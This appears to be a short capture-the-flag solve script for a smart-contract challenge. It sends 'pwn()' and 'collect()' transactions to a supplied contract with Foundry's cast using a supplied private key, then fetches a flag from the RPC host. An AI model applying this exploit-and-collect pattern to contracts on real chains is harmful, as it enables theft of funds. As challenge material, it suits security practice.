RPC=$1
PK=$2
C=$3
cast send "$C" "pwn()" --rpc-url "$RPC" --private-key "$PK"
cast send "$C" "collect()" --rpc-url "$RPC" --private-key "$PK"
curl -s "$RPC/flag"
